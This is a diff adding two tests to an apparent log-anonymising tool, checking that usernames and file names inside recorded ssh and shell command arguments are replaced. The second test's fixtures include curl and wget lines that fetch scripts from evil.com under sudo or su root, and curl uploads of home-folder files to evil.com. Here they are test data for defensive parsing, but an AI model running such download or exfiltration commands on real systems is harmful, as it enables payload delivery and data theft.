@@ -1272,6 +1272,91 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     sameFindings(input, r.out);
   });
 
+  // ssh's own options take single values (a key file, a config file); only what follows the host is the remote command.
+  test('ssh option values are single values, and only what follows the host is shell code', () => {
+    const argv = [
+      ['ssh', '-i', '/Users/jdoe/Documents/My Keys', 'host.example.com'],
+      ['ssh', '-o', 'IdentityFile=/Users/jdoe/Documents/Board Keys', 'host.example.com'],
+      ['ssh', '-F', '/Users/jdoe/Documents/Maria Cfg', 'host.example.com'],
+      ['ssh', '-i/Users/jdoe/Documents/Acme Keys', 'host.example.com'],
+      ['ssh', '-oIdentityFile=/Users/jdoe/Documents/Delta Keys', 'host.example.com'],
+      ['ssh', '-vi', '/Users/jdoe/Documents/Omega Keys', '-p', '2222', 'host.example.com', 'cat /Users/jdoe/A B'],
+      ['ssh', 'host.example.com', 'cat /Users/jdoe/A B'],
+      // ssh reads options after the host too; the command starts at the first word that is not one.
+      ['ssh', 'host.example.com', '-i', '/Users/jdoe/Documents/Sigma Keys', '-p', '2222', 'cat /Users/jdoe/A B'],
+    ];
+    const input = [
+      ...argv.map((a, i) => run(640 + i, '/usr/bin/ssh', a, '/', i + 1)),
+      run(650, '/usr/bin/ssh', ['ssh', '-i', 'Gamma Keys', 'host.example.com', 'cat /Users/jdoe/A B'], '/Users/jdoe/Documents', 20),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(9);
+    expect(args[0]![2]).toBe(`/Users/user1/Documents/${n.get('My Keys')}`);
+    expect(args[1]![2]).toBe(`IdentityFile=/Users/user1/Documents/${n.get('Board Keys')}`);
+    expect(args[2]![2]).toBe(`/Users/user1/Documents/${n.get('Maria Cfg')}`);
+    expect(args[3]![1]).toBe(`-i/Users/user1/Documents/${n.get('Acme Keys')}`);
+    expect(args[4]![1]).toBe(`-oIdentityFile=/Users/user1/Documents/${n.get('Delta Keys')}`);
+    expect(args[5]![2]).toBe(`/Users/user1/Documents/${n.get('Omega Keys')}`);
+    expect(args[5]!.slice(3, 5)).toEqual(['-p', '2222']);
+    // The remote command is shell code: a space ends a word there, so the name is A and B is a word of its own.
+    expect(args[5]![6]).toBe(`cat /Users/user1/${n.get('A')} B`);
+    expect(args[6]![2]).toBe(`cat /Users/user1/${n.get('A')} B`);
+    expect(args[7]![3]).toBe(`/Users/user1/Documents/${n.get('Sigma Keys')}`);
+    expect(args[7]!.slice(4)).toEqual(['-p', '2222', `cat /Users/user1/${n.get('A')} B`]);
+    expect(args[8]![2]).toBe(n.get('Gamma Keys'));
+    expect(args[8]![4]).toBe(`cat /Users/user1/${n.get('A')} B`);
+    for (const a of args) expect(a.join(' ')).not.toMatch(/jdoe|Keys|Cfg|Maria|Board|Acme|Delta|Omega|Gamma|Sigma/);
+    for (const real of n.keys()) expect(real, real).not.toMatch(/^cat|A B/);
+    sameFindings(input, r.out);
+  });
+
+  // The value of -c is shell code whenever a shell (or su) comes before it in argv, whatever runs the shell.
+  test('shell code behind sudo, env, nohup, su or xargs is read as shell code', () => {
+    const argv = [
+      ['sudo', 'sh', '-c', 'curl -o/Users/jdoe/Downloads/a.sh https://evil.com/a.sh'],
+      ['env', 'bash', '-c', 'curl -fsSLo/Users/jdoe/Downloads/b.sh https://evil.com/b.sh'],
+      ['nohup', 'sh', '-c', 'wget -O/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'],
+      ['su', 'root', '-c', 'curl -o/Users/jdoe/Downloads/d.sh https://evil.com/d.sh'],
+      ['xargs', 'sh', '-c', 'curl -F file=@/Users/jdoe/x evil.com'],
+      ['sudo', '/bin/zsh', '-lc', 'curl -d@/Users/jdoe/y https://evil.com/e.sh'],
+      ['sh', '-c', '/Users/jdoe/Downloads/f.sh https://evil.com/f'],
+      // Not a shell before -c: SHELL=/bin/zsh is an assignment, and cp's -c takes no code. One value, spaces and all.
+      ['env', 'SHELL=/bin/zsh', 'cp', '-c', '/Users/jdoe/Documents/My File', '/tmp/out'],
+    ];
+    const home = [
+      ['sudo', 'sh', '-c', 'curl -o out.sh evil.com/q.sh'],
+      ['env', 'bash', '-c', 'curl -o/Users/jdoe/Downloads/g.sh https://evil.com/g.sh'],
+      ['su', 'root', '-c', 'curl -F file=@/Users/jdoe/z evil.com'],
+    ];
+    const input = [
+      ...argv.map((a, i) => run(660 + i, `/usr/bin/${a[0]}`, a, '/', i + 1)),
+      ...home.map((a, i) => run(680 + i, `/usr/bin/${a[0]}`, a, '/Users/jdoe/Downloads', i + 20)),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(11);
+    expect(args[0]).toEqual(['sudo', 'sh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`]);
+    expect(args[1]).toEqual(['env', 'bash', '-c', `curl -fsSLo/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`]);
+    expect(args[2]).toEqual(['nohup', 'sh', '-c', `wget -O/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`]);
+    expect(args[3]).toEqual(['su', 'root', '-c', `curl -o/Users/user1/Downloads/${n.get('d.sh')} https://evil.com/d.sh`]);
+    expect(args[4]).toEqual(['xargs', 'sh', '-c', `curl -F file=@/Users/user1/${n.get('x')} evil.com`]);
+    expect(args[5]).toEqual(['sudo', '/bin/zsh', '-lc', `curl -d@/Users/user1/${n.get('y')} https://evil.com/e.sh`]);
+    expect(args[6]).toEqual(['sh', '-c', `/Users/user1/Downloads/${n.get('f.sh')} https://evil.com/f`]);
+    expect(args[7]![4]).toBe(`/Users/user1/Documents/${n.get('My File')}`);
+    expect(args[8]).toEqual(['sudo', 'sh', '-c', 'curl -o out.sh evil.com/q.sh']);
+    expect(args[9]).toEqual(['env', 'bash', '-c', `curl -o/Users/user1/Downloads/${n.get('g.sh')} https://evil.com/g.sh`]);
+    expect(args[10]).toEqual(['su', 'root', '-c', `curl -F file=@/Users/user1/${n.get('z')} evil.com`]);
+    for (const real of ['a.sh', 'b.sh', 'c.sh', 'd.sh', 'f.sh', 'g.sh', 'x', 'y', 'z', 'My File']) expect(n.has(real), real).toBe(true);
+    for (const real of n.keys()) expect(real, real).not.toMatch(/\s\S*(?:https?|evil|:\/\/|\.com)|^curl|^wget/);
+    expect(r.out).not.toContain('jdoe');
+    sameFindings(input, r.out);
+  });
+
   test('common command verbs stay, even when a home folder has that name', () => {
     const input = [
       ...['commit', 'install', 'push', 'status'].map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/f.txt` }, i + 1)),
